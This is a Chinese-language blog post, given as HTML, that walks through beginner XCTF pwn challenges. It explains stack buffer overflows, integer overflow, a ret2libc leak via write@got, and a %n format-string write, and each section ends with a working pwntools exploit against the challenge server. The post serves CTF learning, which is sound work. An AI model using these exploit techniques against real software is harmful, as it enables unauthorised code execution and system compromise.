@@ -1,0 +1,563 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="前言攻防世界 pwn 入门 hello pwn64位程序 read函数读取0x10到地址601068然后与地址60106c进行比较">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界 pwn 新手">
+<meta property="og:url" content="http://example.com/2021/11/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20pwn/index.html">
+<meta property="og:site_name" content="Y0ng的博客">
+<meta property="og:description" content="前言攻防世界 pwn 入门 hello pwn64位程序 read函数读取0x10到地址601068然后与地址60106c进行比较">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/81851c1fd5e14350b4a113a9fcc91149.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/0359931590944ebf95d1769ee0c70a42.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/27199c60b76c4bcc96b4426b2108d9ae.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/37608bd2160c4f8ca3e0fdf4bf9ed645.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/376ade5d0dc742bdbb44b784bc74567a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_12,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/fbde8e34d7bf4459bb6fe1aec178cf08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/902cc37738de4ffcb45fe4139dccd7af.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/45ef7ff4a1cd47a1b01cec5643a29af6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/83db82ec2748406891092a88a02c51ca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/43e934f49fea4bf8afdad2ab6c377bae.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3cbefaed83b547eeafbdc3c93c9f4d0c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6d53a7536683402b9fc60a37832074b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ce1ce8d947e349b6b6adcaef4c3c245c.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2720281457b64f2480c959564dc56f0c.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3a59c25e5f6a4b7da6c337fc9d842605.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a5fafe809673499fb4ed24448e3e9a68.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/8600202ec16448c08d3fe51cc078c2fb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/869ae7f8af6b4f4aa8da43a4ec0fc8a3.png#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/293236a289cc492d8ae2b4add2495399.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b531fb158c29479d980aa8be0fb3b62d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/98a3f38bd8e74642b9211db54c118788.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center">
+<meta property="article:published_time" content="2021-11-12T09:51:50.689Z">
+<meta property="article:modified_time" content="2021-11-12T09:50:58.999Z">
+<meta property="article:author" content="Y0ng">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/81851c1fd5e14350b4a113a9fcc91149.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center">
+
+<link rel="canonical" href="http://example.com/2021/11/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20pwn/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>攻防世界 pwn 新手 | Y0ng的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Y0ng的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">16</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">109</span></a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%20pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cys.jpg">
+      <meta itemprop="name" content="Y0ng">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防世界 pwn 新手
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-11-12 17:51:50 / 修改时间：17:50:58" itemprop="dateCreated datePublished" datetime="2021-11-12T17:51:50+08:00">2021-11-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">二进制</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>攻防世界 pwn 入门</p>
+<h1 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello pwn"></a>hello pwn</h1><p><img src="https://img-blog.csdnimg.cn/81851c1fd5e14350b4a113a9fcc91149.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>64位程序 read函数读取0x10到地址601068然后与地址60106c进行比较</p>
+<a id="more"></a>
+
+<p><img src="https://img-blog.csdnimg.cn/0359931590944ebf95d1769ee0c70a42.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
+<p>因为这两个地址相差4，但是可以读取10</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&#39;111.200.241.244&#39;,50691)</span><br><span class="line">payload &#x3D; &#39;a&#39;*4 + p64(1853186401)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h1><p><img src="https://img-blog.csdnimg.cn/27199c60b76c4bcc96b4426b2108d9ae.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/37608bd2160c4f8ca3e0fdf4bf9ed645.png#pic_center"><br>但是只发现了在函数列表中存在一个callsystem函数</p>
+<p><img src="https://img-blog.csdnimg.cn/376ade5d0dc742bdbb44b784bc74567a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_12,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>那么可以先填充80个字节，然后，将rip填充为callsystem()的地址</p>
+<p><img src="https://img-blog.csdnimg.cn/fbde8e34d7bf4459bb6fe1aec178cf08.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>call, 执行函数调用. 当 CPU 执行 call 指令时, 首先会把 rip 寄存器的值入栈, 然后设置 rip 值为目标地址, 由于 rip 寄存 器的值决定了下一条CPU需要执行指令的位置, 所以当 CPU 执行完成当前 call 指令后就会跳转到目标地址.</p>
+<p>因此可以借助vulnerable_function()的read函数，将缓冲区填充满，再将<code>ebp+0x8即eip所在的地址覆盖为callsystem函数地址</code>，即可得到shell。</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&#39;111.200.241.244&#39;,60861)</span><br><span class="line">#r &#x3D; process(&#39;.&#x2F;level0&#39;)</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x80+&#39;a&#39;*0x8 + p64(0x00400596)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h1><p>32位程序</p>
+<p><img src="https://img-blog.csdnimg.cn/902cc37738de4ffcb45fe4139dccd7af.png#pic_center"><br>Read存在溢出，buf这个字符数组的长度只有0x88，却可以输入0x100的东西，能覆盖掉数组外面的东西。当属于数组的空间结束后，有一个4个字节长度的s，其次是一个存放着返回地址的r。我们可以输入数据，覆盖返回地址r。</p>
+<p>没有什么危险，也没有像level0一样，有后门函数</p>
+<p><img src="https://img-blog.csdnimg.cn/45ef7ff4a1cd47a1b01cec5643a29af6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>在 .plt段 发现_system函数且在 数据段 发现/bin/bash地址</p>
+<p><img src="https://img-blog.csdnimg.cn/83db82ec2748406891092a88a02c51ca.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_17,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>根据32位程序栈结构：</p>
+<p><img src="https://img-blog.csdnimg.cn/43e934f49fea4bf8afdad2ab6c377bae.png#pic_center"><br>poc:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; remote(&#39;111.200.241.244&#39;,60254)</span><br><span class="line">#r &#x3D; process(&#39;.&#x2F;level2&#39;)</span><br><span class="line">bash_add &#x3D; 0x0804a024</span><br><span class="line">sys_add &#x3D; 0x08048320</span><br><span class="line">payload &#x3D; &#39;a&#39;*0x88+&#39;a&#39;*0x4 + p32(sys_add)+p32(0)+p32(bash_add)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>p32(0)是为了填充函数返回地址，随便返回到哪都行</p>
+<h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><p><img src="https://img-blog.csdnimg.cn/3cbefaed83b547eeafbdc3c93c9f4d0c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>Gets栈溢出覆盖seed的值 使其为伪随机数</p>
+<p>poc：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; remote(&quot;111.200.241.244&quot;,63805)</span><br><span class="line"></span><br><span class="line">payload &#x3D; b&#39;a&#39; * (0x30-0x10) + p64(0).decode(&#39;unicode_escape&#39;)</span><br><span class="line">r.sendlineafter(&quot;Your name:&quot;,payload)</span><br><span class="line">l &#x3D; [&#39;2&#39;,&#39;5&#39;,&#39;4&#39;,&#39;2&#39;,&#39;6&#39;,&#39;2&#39;,&#39;5&#39;,&#39;1&#39;,&#39;4&#39;,&#39;2&#39;]</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    r.sendlineafter(&quot;Please input your guess number:&quot;,l[i])</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><p>整数溢出</p>
+<p><img src="https://img-blog.csdnimg.cn/6d53a7536683402b9fc60a37832074b6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>无符号整数类型的v3 存入到al 8位寄存器</p>
+<p><img src="https://img-blog.csdnimg.cn/ce1ce8d947e349b6b6adcaef4c3c245c.png#pic_center"><br>可利用函数且有地址</p>
+<p><img src="https://img-blog.csdnimg.cn/2720281457b64f2480c959564dc56f0c.png#pic_center"><br>那么整数的范围就是0-255(00000000–11111111)</p>
+<p><code>如果超过这个范围那么就会进行模运算比如 输入257  那么结果就是 257%255=2</code></p>
+<p>可以看到有一个前提条件就是我们输入的长度必须是,(4,8]才能进入到else 那么输入的长度就应该是(259,263]</p>
+<p>通过strcpy来让dest溢出，覆盖返回地址到what_is_this()</p>
+<p>那么<code>payload = &#39;a&#39;*(0x14+4)+p32(flag).decode(&#39;iso-8859-1&#39;)+&#39;a&#39;*232</code></p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; remote(&quot;111.200.241.244&quot;,51588)</span><br><span class="line"></span><br><span class="line">flag &#x3D; 0x0804868B</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x14+4)+p32(flag).decode(&#39;iso-8859-1&#39;)+&#39;a&#39;*232</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&quot;Your choice:&quot;,&#39;1&#39;)</span><br><span class="line"> </span><br><span class="line">r.sendlineafter(&quot;input your username:&quot;,&quot;test&quot;)</span><br><span class="line"> </span><br><span class="line">r.sendlineafter(&quot;input your passwd:&quot;,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><p><img src="https://img-blog.csdnimg.cn/3a59c25e5f6a4b7da6c337fc9d842605.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>Fgets传入/bin/sh<br>Gets栈溢出跳到system</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&quot;111.200.241.244&quot;,51213)</span><br><span class="line">shell &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">name &#x3D; 0x0804A080</span><br><span class="line">payload &#x3D; &#39;a&#39;*(0x26+4)+p32(0x08048420).decode(&#39;unicode_escape&#39;)+&#39;a&#39;*4+p32(name).decode(&#39;unicode_escape&#39;)</span><br><span class="line">r.sendlineafter(&quot;please tell me your name&quot;,shell)</span><br><span class="line">r.sendlineafter(&quot;hello,you can leave some message here:&quot;,payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>构造payload的时候注意这是32位程序，而32位程序调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1</p>
+<h1 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h1><p>参考：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuren123/p/12735145.html">攻防世界PWN题 level3 - 愚人呀 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-254858.htm">[原创]XCTF攻防世界 level3-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
+<p><img src="https://img-blog.csdnimg.cn/a5fafe809673499fb4ed24448e3e9a68.png#pic_center"><br><img src="https://img-blog.csdnimg.cn/8600202ec16448c08d3fe51cc078c2fb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_14,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>Buf定义0x88但是可以输入0x100</p>
+<p>但是没有像上面题目存在system函数和/bin/sh的字符串，但是write函数是载入了外部的运行库</p>
+<p><img src="https://img-blog.csdnimg.cn/869ae7f8af6b4f4aa8da43a4ec0fc8a3.png#pic_center"><br>那就通过write函数打印出泄露的write函数在got中的地址 然后通过.so文件找出write在libc_32.so.6中的地址 接着就可以计算出libc基地址了。</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r &#x3D; process(&#39;.&#x2F;level3&#39;)</span><br><span class="line">r &#x3D; remote(&#39;111.200.241.244&#39;,56507)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;level3&quot;)</span><br><span class="line">write_plt &#x3D; elf.plt[&quot;write&quot;]</span><br><span class="line">write_got &#x3D; elf.got[&quot;write&quot;]</span><br><span class="line">main &#x3D; elf.symbols[&quot;main&quot;]</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(&quot;.&#x2F;libc_32.so.6&quot;)</span><br><span class="line">write_libc &#x3D; libc.symbols[&quot;write&quot;]</span><br><span class="line">sys_libc &#x3D; libc.symbols[&quot;system&quot;]</span><br><span class="line">binsh_libc &#x3D; libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()</span><br><span class="line"></span><br><span class="line">payload1 &#x3D; b&#39;a&#39;*0x88+b&#39;a&#39;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">r.sendlineafter(&#39;Input:\n&#39;,payload1)</span><br><span class="line">write_addr &#x3D; u32(r.recv()[:4])</span><br><span class="line"></span><br><span class="line">sysaddr &#x3D; write_addr - write_libc + sys_libc</span><br><span class="line">binshaddr &#x3D; write_addr - write_libc + binsh_libc</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; b&#39;a&#39;*0x88+b&#39;a&#39;*0x4+p32(sysaddr)+p32(0)+p32(binshaddr)</span><br><span class="line">r.sendlineafter(&#39;Input:\n&#39;,payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>payload1中：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#39;a&#39;*0x88+b&#39;a&#39;*0x4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">填充+ebp+返回到write函数+二次攻击从main开始+参数1+参数write_got+参数4字节</span><br></pre></td></tr></table></figure>
+
+<p>那么为啥要传个write_got呢？</p>
+<p>我理解是现在的write_got<code>存放的是这个程序运行时write函数的地址</code>，如下图</p>
+<p><img src="https://img-blog.csdnimg.cn/293236a289cc492d8ae2b4add2495399.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>那么正好就打印了write函数地址造成泄露，<code>又因为库函数中字符串常量和函数之间的相对位置也是确定的</code>，所以可以找到当前system函数的真实地址并利用</p>
+<h1 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h1><p>参考：<a target="_blank" rel="noopener" href="https://niceseven.github.io/post/2020/02/06/xctf-pwn-cgfsb/">XCTF Pwn CGfsb | NiceSeven’s Website</a></p>
+<p>格式化字符串漏洞的简单利用</p>
+<p><img src="https://img-blog.csdnimg.cn/b531fb158c29479d980aa8be0fb3b62d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_19,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>printf函数的格式化字符串常见的有<code> %d，%f，%c，%s，%x（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等</code>。</p>
+<p>但是有个不常见的格式化字符串 <code>%n</code> ，它的功能是<code>将%n之前打印出来的字符个数，赋值给一个变量</code>。</p>
+<p>%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</p>
+<p><code>变量pwnme</code>的位置在bss段，地址为<code>0x0804a068</code></p>
+<p>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，bss段属于静态内存分配，地址不变</p>
+<p>确定偏移：</p>
+<p><img src="https://img-blog.csdnimg.cn/98a3f38bd8e74642b9211db54c118788.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"><br>为10</p>
+<p>把pwnme的地址输进去，偏移10 将8利用 %n带入到pwnme的地址，所以变量pwnme就是8了</p>
+<p>poc:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; remote(&#39;111.200.241.244&#39;,50887)</span><br><span class="line"></span><br><span class="line">pwnme &#x3D; 0x0804a068</span><br><span class="line"></span><br><span class="line">payload &#x3D; p32(pwnme)+b&#39;a&#39;*4+b&#39;%10$n&#39;</span><br><span class="line">r.sendlineafter(&#39;please tell me your name:&#39;,&#39;aaa&#39;)</span><br><span class="line">r.sendlineafter(&#39;leave your message please:&#39;,payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/09/%E8%9A%81%E5%89%91PHP-FPM%20bypass%20disable_function/" rel="prev" title="蚁剑 PHP-FPM bypass disable_function">
+      <i class="fa fa-chevron-left"></i> 蚁剑 PHP-FPM bypass disable_function
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
